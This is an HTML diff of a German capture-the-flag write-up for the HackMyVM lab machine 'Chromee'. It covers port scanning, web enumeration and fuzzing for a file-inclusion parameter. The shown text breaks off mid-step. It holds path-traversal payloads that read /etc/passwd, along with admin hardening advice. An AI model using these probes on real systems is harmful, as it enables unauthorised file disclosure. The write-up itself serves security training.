@@ -1,1 +1,1655 @@
-﻿﻿
+
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chromee - HackMyVM - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ <div class="header-bg">
+        <h1>Chromee - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">Burpsuite</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">CrackStation</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">ll</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ssh2john</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">env</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">identify</div>
+                <div class="tool-item">CyberChef</div>
+                <div class="tool-item">cupp</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">403-bypass.sh</div>
+                <div class="tool-item">doas</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">chromium</div>
+                <div class="tool-item">su</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p>
+                Meine initiale Aufklärung begann mit der Identifizierung der Ziel-IP-Adresse im lokalen Netzwerk. Ich habe einen ARP-Scan verwendet, um aktive Hosts zu finden und nach der spezifischen VirtualBox-Vendor-ID zu filtern, um das Zielsystem einzugrenzen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">arp-scan -l | grep &quot;PCS&quot; | awk &apos;{print $1}&apos;</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.187</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `arp-scan -l` scannt das lokale Netzwerk nach aktiven Geräten. Die Ausgabe wird an `grep "PCS"` weitergeleitet, um Zeilen zu finden, die "PCS" enthalten (was auf die PCS Systemtechnik Vendor ID von VirtualBox hindeutet). Der gefilterte Output wird dann an `awk '{print $1}'` übergeben, um nur das erste Feld, die IP-Adresse, auszugeben. Das Ergebnis ist die IP-Adresse `<span class="command">192.168.2.187</span>`, die sehr wahrscheinlich die des Zielsystems ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein effizienter und gezielter Weg, die IP-Adresse des Zielsystems in einem bekannten Netzwerksegment zu identifizieren, insbesondere wenn man weiß, dass es sich um eine virtuelle Maschine (hier VirtualBox) handelt. Dieser Schritt liefert die notwendige IP für weitere Scans.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Notiere die gefundene IP-Adresse als Ziel für alle weiteren Aktionen.
+                <br><strong>Empfehlung (Admin):</strong> Sei dir bewusst, dass MAC-Adressen und Vendor-Informationen Hinweise auf die zugrundeliegende Infrastruktur geben können.
+            </p>
+
+             <p>
+                 Ich habe die gefundene IP-Adresse zu meiner lokalen Hosts-Datei hinzugefügt, um das Ziel über seinen Hostnamen ansprechen zu können.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">vi /etc/hosts </span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.187    chromee.hmv</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Der Befehl `vi /etc/hosts` öffnet die Hosts-Datei, um eine manuelle Zuordnung der IP-Adresse 192.168.2.187 zum Hostnamen chromee.hmv vorzunehmen. Diese lokale Konfiguration vereinfacht die Referenzierung des Ziels in nachfolgenden Befehlen.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Dies ist ein reiner Komfort-Schritt für den Pentester. Es hat keine Auswirkungen auf die Sicherheit des Zielsystems, verbessert aber die Lesbarkeit der Befehle im Bericht.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Die Verwendung des Hostnamens ist nun möglich.
+                 <br><strong>Empfehlung (Admin):</strong> Keine direkte sicherheitsrelevante Empfehlung aus diesem Schritt.
+             </p>
+
+
+            <p>
+                Der nächste entscheidende Schritt war ein umfassender Port-Scan mit Nmap, um alle offenen Ports zu identifizieren, die potenziellen Angriffsvektoren darstellen. Ich habe einen aggressiven Scan mit Service- und Versionserkennung sowie OS-Fingerprinting durchgeführt.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">nmap -sC -sS -sV -T5 -A 192.168.2.187 -p- | grep open</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+<span class="command">80/tcp    open  http    nginx 1.18.0</span>
+<span class="command">8080/tcp  open  http    Apache httpd 2.4.56 ((Debian))</span>
+<span class="command">|_http-open-proxy: Proxy might be redirecting requests</span>
+<span class="command">23333/tcp open  ftp     vsftpd 3.0.3</span></pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">nmap -sC -sS -sV -T5 -A 192.168.2.187 -p- </span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Starting Nmap 7.95 ( <span class="command">[Link: https://nmap.org | Ziel: https://nmap.org]</span> ) at <span class="command">2025-04-30 22:58 CEST</span>
+<span class="command">Nmap scan report for Chromee (192.168.2.187)</span>
+Host is up (<span class="command">0.00016s latency</span>).
+Not shown: <span class="command">65531 closed tcp PORTs (reset)</span>
+<span class="command">PORT      STATE SERVICE VERSION</span>
+<span class="command">22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+<span class="command">| ssh-hostkey: </span>
+<span class="command">|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)</span>
+<span class="command">|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)</span>
+<span class="command">|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)</span>
+<span class="command">80/tcp    open  http    nginx 1.18.0</span>
+<span class="command">|_http-server-header: nginx/1.18.0</span>
+<span class="command">|_http-title: primary</span>
+<span class="command">8080/tcp  open  http    Apache httpd 2.4.56 ((Debian))</span>
+<span class="command">|_http-server-header: Apache/2.4.56 (Debian)</span>
+<span class="command">|_http-title: <span class="command">Site doesn&apos;t have a title (text/html)</span>.</span>
+<span class="command">|_http-open-proxy: Proxy might be redirecting requests</span>
+<span class="command">23333/tcp open  ftp     vsftpd 3.0.3</span>
+<span class="command">MAC Address: 08:00:27:A5:6F:25 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+<span class="command">Device type: general purpose|router</span>
+Running: <span class="command">Linux 4.X|5.X, MikroTik RouterOS 7.X</span>
+<span class="command">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span>
+<span class="command">OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span>
+Network Distance: <span class="command">1 hop</span>
+<span class="command">Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="command">TRACEROUTE</span>
+HOP RTT     ADDRESS
+1   <span class="command">0.16 ms Chromee (192.168.2.187)</span>
+
+<span class="command">OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/] .</span>
+<span class="command">Nmap done: 1 IP address (1 host up) scanned in 10.91 seconds</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Nmap-Scan identifizierte vier offene TCP-Ports: 22 (SSH), 80 (HTTP), 8080 (HTTP) und 23333 (FTP). Auf Port 22 läuft OpenSSH 8.4p1 auf Debian. Port 80 wird von nginx 1.18.0 mit dem Titel "primary" gehostet. Port 8080 wird von Apache httpd 2.4.56 gehostet, und Nmap gibt den Hinweis `|_http-open-proxy: Proxy might be redirecting requests` aus, was auf einen potenziellen Open Proxy hindeutet. Port 23333 läuft vsftpd 3.0.3. Die OS-Erkennung tippt auf Linux.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Vier offene Ports bieten eine breitere Angriffsfläche. Die beiden HTTP-Ports (80 und 8080) sind die wahrscheinlichsten Vektoren für Initial Access. Der FTP-Dienst (Port 23333) könnte anfällig für Brute-Force-Angriffe oder anonymen Login sein. SSH (Port 22) ist ein Standarddienst, der auf schwache Anmeldedaten geprüft werden sollte. Die Versionen von OpenSSH (8.4p1), nginx (1.18.0), Apache (2.4.56) und vsftpd (3.0.3) sollten auf bekannte Schwachstellen geprüft werden. Der Open Proxy Hinweis auf Port 8080 ist ebenfalls bemerkenswert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche die Webanwendungen auf Port 80 und 8080 detailliert. Prüfe FTP auf anonymen Login und Brute-Force-Angriffe. Untersuche SSH auf schwache Anmeldedaten. Prüfe alle identifizierten Softwareversionen auf bekannte CVEs. Verfolge den Hinweis auf den Open Proxy auf Port 8080.
+                <br><strong>Empfehlung (Admin):</strong> Schließe alle unnötigen Ports. Halte alle Dienste auf dem neuesten Stand. Überprüfe die Konfiguration des Apache auf Port 8080, um sicherzustellen, dass er kein offener Proxy ist. Härde die SSH- und FTP-Konfigurationen.
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p>
+                Ich begann die detaillierte Web-Enumeration mit einem Scan auf Port 80 mittels Nikto, um gängige Schwachstellen und interessante Pfade zu identifizieren.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">nikto -h http://192.168.2.187</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.187</span>
++ Target Hostname:    <span class="command">192.168.2.187</span>
++ Target <span class="command">PORT</span>:        <span class="command">80</span>
++ Start Time:         <span class="command">2025-04-30 22:58:21 (GMT2)</span>
+---------------------------------------------------------------------------
++ Server: <span class="command">nginx/1.18.0</span>
++ /: The anti-clickjacking <span class="command">X-Frame-Options</span> header is not present. See: <span class="command">[Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
++ /: The <span class="command">X-Content-Type-Options</span> header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: <span class="command">[Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
++ No CGI Directories found (use &apos;-C all&apos; to force check all possible dirs)
++ <span class="password">/#wp-config.php#</span>: <span class="password">#wp-config.<span class="command">php</span># file found. This file contains the credentials.</span>
++ <span class="command">8102 requests: 0 error(s) and 3 item(s) reported on remote host</span>
++ End Time:           <span class="command">2025-04-30 22:58:47 (GMT2) (26 seconds)</span>
+---------------------------------------------------------------------------
++ <span class="command">1 host(s) tested</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Nikto bestätigte den nginx 1.18.0 Server auf Port 80. Es identifizierte das Fehlen von `X-Frame-Options` und `X-Content-Type-Options` Headern. Der bemerkenswerteste Fund ist der Hinweis auf die Datei `/#wp-config.php#`, die laut Nikto Anmeldedaten enthält. Dies könnte auf ein falsch konfiguriertes Backup oder eine expose Konfigurationsdatei hinweisen. Es ist wahrscheinlich, dass dies ein statisches oder Backup-File ist, das unbeabsichtigt zugänglich ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Fehlen von Sicherheits-Headern sind geringe Schwachstellen. Der Fund von `/#wp-config.php#` ist potenziell eine hohe Schwachstelle, da sie Anmeldedaten preisgeben könnte. Dies muss sofort manuell überprüft werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche, die Datei `/#wp-config.php#` direkt über den Browser oder `curl` abzurufen und ihren Inhalt zu prüfen. Notiere die fehlenden Sicherheits-Header.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere fehlende HTTP-Sicherheits-Header. Stelle sicher, dass Backup- oder Konfigurationsdateien (`#dateiname#` Muster sind oft Editoren-Backups) nicht öffentlich zugänglich sind. Konfiguriere den Webserver so, dass solche Dateien blockiert werden.
+            </p>
+
+            <p>
+                Parallel zu Nikto habe ich Gobuster verwendet, um eine umfassende Verzeichnis- und Datei-Enumeration auf beiden HTTP-Ports (80 und 8080) durchzuführen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">gobuster dir -u &quot;http://chromee.hmv&quot; -w &quot;/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt&quot; -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml -b &apos;503,404,403&apos; -e --no-error -k</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] <span class="command">Url:                     http://chromee.hmv</span>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/<span class="command">directory-list-2.3-medium.txt</span>
+[+] Negative Status codes:   503,404,403
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              eps,ln,rar,db,lib,<span class="command">pub</span>,py,json,desc,<span class="command">zip</span>,gz,raw,rtf,config,<span class="command">icon</span>,xls,bat,<span class="command">txt</span>,csv,elf,csh,exe,<span class="command">phtml</span>,<span class="command">dll</span>,jpeg,<span class="command">jpg</span>,<span class="command">js.map</span>,bak,pem,<span class="command">c</span>,exp,<span class="command">cgi</span>,mod,tar,docx,aspx,sh,<span class="command">pdf</span>,xlsx,conf,crt,<span class="command">ELF</span>,java,rpm,mdb,accdb,<span class="command">pl</span>,<span class="command">png</span>,xml,kdbx,old,sql,html,<span class="command">php</span>,<span class="command">doc</span>,asp,<span class="command">ps1</span>,deb,<span class="command">diff</span>,<span class="command">svg</span>,<span class="command">pHtml</span>
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://chromee.hmv/index.html           (Status: 200) [Size: 4464]</span>
+<span class="command">http://chromee.hmv/post.php             (Status: 200) [Size: 3]</span>
+<span class="command">http://chromee.hmv/secret.php           (Status: 200) [Size: 175]</span>
+<span class="command">http://chromee.hmv:8080/index.html           (Status: 200) [Size: 33]</span>
+<span class="command">http://chromee.hmv:8080/javascript           (Status: 301) [Size: 322] [--&gt; http://chromee.hmv:8080/javascript/]</span>
+<span class="command">http://chromee.hmv:8080/silence              (Status: 403) [Size: 13]</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Gobuster fand auf Port 80 (`chromee.hmv`) drei interessante Dateien: `index.html` (die Hauptseite), `post.php` (sehr klein, deutet auf einen Endpunkt hin) und `secret.php`. Auf Port 8080 (`chromee.hmv:8080`) fand es `index.html`, das Verzeichnis `javascript/` (mit 301 Redirect) und das Verzeichnis `silence/` (mit 403 Forbidden Status). Dies sind vielversprechende Endpunkte für weitere Untersuchungen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Gobuster-Ergebnisse liefern konkrete Pfade, die weiter untersucht werden müssen. `secret.php` und `post.php` auf Port 80 könnten Web-Schwachstellen enthalten. `silence/` auf Port 8080, das eine 403 Forbidden Antwort liefert, ist ein klassisches Ziel für Bypass-Versuche.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt und die Funktionalität von `secret.php` und `post.php`. Versuche, die 403 Forbidden Antwort auf `/silence/` zu umgehen, z.B. mit HTTP Method Bypassing.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere eine präzise Zugriffskontrolle für Verzeichnisse wie `silence/` und stelle sicher, dass 403-Antworten nicht durch einfache Methoden wie HTTP Method Bypassing umgangen werden können. Überprüfe `post.php` und `secret.php` auf Schwachstellen.
+            </p>
+
+             <p>
+                 Ich habe die Webanwendung auf Port 8080 (`chromee.hmv:8080`) genauer untersucht, insbesondere da Nmap einen potenziellen Open Proxy gemeldet hatte. Ich habe versucht, die Startseite aufzurufen und einen File-Inclusion-Test durchzuführen.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="command">[Link: http://chromee.hmv:8080/ | Ziel: http://chromee.hmv:8080/]</span>
+You may need to bypass!
+
+<span class="command">[Link: http://chromee.hmv:8080/?file=file:///../../../../../../../../../../../../../../../etc/passwd | Ziel: http://chromee.hmv:8080/?file=file:///../../../../../../../../../../../../../../../etc/passwd]</span>
+You may need to bypass!
+
+
+<span class="command">[Link: http://chromee.hmv:8080/index.html | Ziel: http://chromee.hmv:8080/index.html]</span>
+You may need to bypass!
+
+
+<span class="command">[Link: http://chromee.hmv:8080/index.php | Ziel: http://chromee.hmv:8080/index.php]</span>
+
+Not Found
+
+The requested <span class="command">URL</span> was not found on this server.
+<span class="command">Apache/2.4.56 (Debian) Server at chromee.hmv PORT 8080 </span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Aufruf von `http://chromee.hmv:8080/` und `http://chromee.hmv:8080/index.html` führte zu einer Antwort, die den Text "You may need to bypass!" enthielt. Dies deutet auf eine Form der Zugriffskontrolle oder Filterung hin, die umgangen werden muss. Ein Versuch, `index.php` aufzurufen, resultierte in einem 404 Not Found Fehler vom Apache Server auf Port 8080. Ein File-Inclusion-Test mit dem Parameter `?file=` und einem Pfad zu `/etc/passwd` zeigte ebenfalls die "You may need to bypass!" Meldung, was darauf hindeutet, dass die Seite auf Port 8080 potenziell anfällig für Local File Inclusion (LFI) ist, aber die Eingabe gefiltert wird.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Webanwendung auf Port 8080 scheint eine Zugriffskontrolle zu haben, die durch die Meldung "You may need to bypass!" signalisiert wird. Die LFI-Testversuche deuten auf eine potenzielle Schwachstelle hin, die aber durch Filterung erschwert wird. Dies erfordert eine weitere Untersuchung, um die Umgehungsmethode zu finden. Der 404 für `index.php` ist nicht ungewöhnlich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche die Filterung auf Port 8080 für die LFI-Schwachstelle. Versuche verschiedene Encoding-Techniken oder Path-Traversal-Variationen, um die Filterung zu umgehen. Behalte die Möglichkeit des Open Proxy im Hinterkopf, falls LFI nicht funktioniert.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere strikte Eingabevalidierung für alle Dateipfade in Webanwendungen. Vermeide die Aufnahme von lokalen Dateien basierend auf Benutzereingaben. Überprüfe die Konfiguration des Apache auf Port 8080, um sicherzustellen, dass er nicht als Open Proxy missbraucht werden kann.
+            </p>
+
+            <p>
+                Als nächstes habe ich die von Gobuster gefundene Datei `post.php` auf Port 80 untersucht.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>-----------------------------------------------------------------------------------------------------------------------
+
+<span class="command">[Link: http://chromee.hmv/post.php | Ziel: http://chromee.hmv/post.php]</span>
+
+<span class="command">Connection	keep-alive</span>
+<span class="command">Content-Type	application/json</span>
+<span class="command">Date	Wed, 30 Apr 2025 21:07:51 GMT</span>
+<span class="command">Server	nginx/1.18.0</span>
+<span class="command">Transfer-Encoding	chunked</span>
+<span class="command">Accept	text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="command">Accept-Encoding	gzip, deflate</span>
+<span class="command">Accept-Language	de,en-US;q=0.7,en;q=0.3</span>
+<span class="command">Connection	keep-alive</span>
+<span class="command">DNT	1</span>
+<span class="command">Host	chromee.hmv</span>
+<span class="command">Priority	u=0, i</span>
+<span class="command">Sec-GPC	1</span>
+<span class="command">Upgrade-Insecure-Requests	1</span>
+<span class="command">User-Agent	Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe die Datei `post.php` auf Port 80 aufgerufen. Die angezeigten Informationen sind hauptsächlich die HTTP-Header, die beim Aufruf gesendet und empfangen werden. Der Server-Header bestätigt nginx 1.18.0. Die `Content-Type: application/json` Angabe ist interessant und deutet darauf hin, dass dieser Endpunkt JSON-Daten erwartet oder liefert, obwohl der ursprüngliche Gobuster-Size von 3 Bytes sehr klein war.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `post.php` scheint ein API-Endpunkt zu sein, der für die Verarbeitung von JSON-Daten vorgesehen ist. Der kleine Size von 3 Bytes deutet darauf hin, dass die Standardantwort bei einem GET-Request oder einem POST ohne die erwarteten Parameter minimal ist. Dies ist ein möglicher Angriffsvektor, der für Injections oder andere Schwachstellen geprüft werden sollte, wenn er mit POST-Daten interagiert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche, POST-Requests mit JSON-Daten an `post.php` zu senden und das Verhalten zu beobachten. Teste auf Schwachstellen wie Blind SQL Injection oder andere API-spezifische Probleme, falls relevante Parameter gefunden werden können.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass API-Endpunkte wie `post.php` robust gegen Injections und andere Web-Schwachstellen sind. Implementiere eine strenge Validierung und Bereinigung von Eingabedaten, insbesondere von JSON-Payloads.
+            </p>
+
+             <p>
+                 Ich habe auch die von Gobuster gefundene Datei `secret.php` auf Port 80 untersucht.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>-----------------------------------------------------------------------------------------------------------------------
+
+<span class="command">[Link: http://chromee.hmv/secret.php | Ziel: http://chromee.hmv/secret.php]</span>
+
+晚上好，adriana
+
+当前时间：<span class="command">2025-04-30 23:08:21</span>
+
+你的IP：<span class="command">192.168.2.199</span>
+
+-----------------------------------------------------------------------------------------------------------------------
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Aufruf von `secret.php` auf Port 80 liefert eine einfache Webseite mit einer Begrüßungsnachricht ("晚上好" - Gute Nacht), gefolgt von einem Namen (`adriana`), der aktuellen Uhrzeit und meiner IP-Adresse. Der Name `adriana` ist ein wichtiger Fund.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `secret.php` scheint eine personalisierte Seite zu sein, die den Benutzernamen `adriana` Hardcoded oder aus einer Quelle bezieht. Die Ausgabe meiner IP-Adresse deutet darauf hin, dass die Seite auf bestimmte Eingaben reagiert oder Informationen über den Request verarbeitet. Dies ist ein vielversprechender Endpunkt für weitere Tests, insbesondere auf Injections oder Informationslecks, da der Name `adriana` nun ein bekannter Benutzername ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche die Parameter, die an `secret.php` übergeben werden könnten, die das Verhalten beeinflussen oder zur Anzeige von Informationen führen. Teste auf File Inclusion oder andere Injections, die den Parameter zur Ausgabe von Dateiinhalten nutzen könnten.
+                <br><strong>Empfehlung (Admin):</strong> Vermeide das Hardcodieren von Benutzernamen in Webseiten-Code. Sei vorsichtig bei der Anzeige von Benutzerinformationen basierend auf Request-Daten. Überprüfe den Code von `secret.php` auf Schwachstellen.
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p>
+                Nach der Analyse von `secret.php` vermutete ich, dass die Seite anfällig für Local File Inclusion (LFI) sein könnte, insbesondere wenn ein Parameter verwendet wird, der den Inhalt einer Datei einbindet oder anzeigt. Ich testete dies aggressiv mit wfuzz und einer LFI-Wortliste.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u &quot;http://chromee.hmv/secret.<span class="command">php</span>?FUZZ=../../../../../../../../../../../../../../../../etc/passwd&quot; --hc 404 --hh 151</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Target: http://chromee.hmv/secret.<span class="command">php</span>?FUZZ=../../../../../../../../../../../../../../../../etc/passwd
+Total requests: <span class="command">220546</span>
+
+=====================================================================
+<span class="command">ID           Response   Lines    Word       Chars       Payload                      </span>
+=====================================================================
+
+<span class="command">000006139:   200        11 L     97 W       658 Ch      &quot;aaa&quot;                        </span>
+
+<span class="command">Total time: 0</span>
+<span class="command">Processed Requests: 220546</span>
+<span class="command">Filtered Requests: 220545</span>
+<span class="command">Requests/sec.: 0</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe wfuzz (`wfuzz`) verwendet, um `secret.php` auf LFI zu testen. Ich gab die URL mit dem Fuzzing-Keyword `FUZZ` an, das durch die Einträge aus der `LFI-Jhaddix.txt` Wortliste ersetzt wird. Als Test-Payload für LFI wurde ein Path-Traversal zu `/etc/passwd` verwendet. Ich habe den Statuscode 404 (`--hc 404`) und eine spezifische Hash-Größe (151, `--hh 151`) ignoriert, die wahrscheinlich der Standardantwort ohne LFI entsprechen. Die Ausgabe zeigt einen einzigen Treffer (`ID 000006139`) mit Statuscode 200, einer anderen Zeilen-, Wort- und Zeichenanzahl als die Standardantwort, und dem Payload `"aaa"`. Dies bedeutet, dass, wenn der Parameter `aaa` aufgerufen wird, die Seite mit einem 200 OK Status und anderem Inhalt antwortet, was auf eine aktive Funktionalität mit diesem Parameter hindeutet, die möglicherweise für LFI genutzt werden kann.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Fuzzing-Test identifiziert, dass der Parameter `aaa` auf `secret.php` existiert und eine abweichende Antwort liefert. Dies ist ein starker Hinweis darauf, dass dieser Parameter benutzt wird und potenziell anfällig ist. Der ursprüngliche LFI-Test mit Path-Traversal war nicht direkt erfolgreich mit dieser spezifischen Wfuzz-Syntax, aber der Parameter `aaa` selbst wurde entdeckt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Teste nun den Parameter `aaa` explizit auf LFI, indem du ihn mit Path-Traversal-Sequenzen befüllst. Da der Parameter gefunden wurde, muss die LFI-Anfälligkeit durch gezielte manuelle oder automatisierte Tests verifiziert werden.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere serverseitige Validierung für alle URL-Parameter, um sicherzustellen, dass sie nur erwartete Zeichen und Formate enthalten. Vermeide die Verwendung von Benutzereingaben in Dateipfad-Operationen.
+            </p>
+
+             <p>
+                 Nach der Entdeckung des `aaa` Parameters habe ich ihn manuell mit einer Path-Traversal-Sequenz auf LFI getestet, um zu versuchen, den Inhalt von `/etc/passwd` auszulesen.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>-----------------------------------------------------------------------------------------------------------------------
+
+<span class="command">[Link: http://chromee.hmv/secret.php?aaa=../../../../../../../../../../../../../../../../etc/passwd | Ziel: http://chromee.hmv/secret.php?aaa=../../../../../../../../../../../../../../../../etc/passwd]</span>
+
+
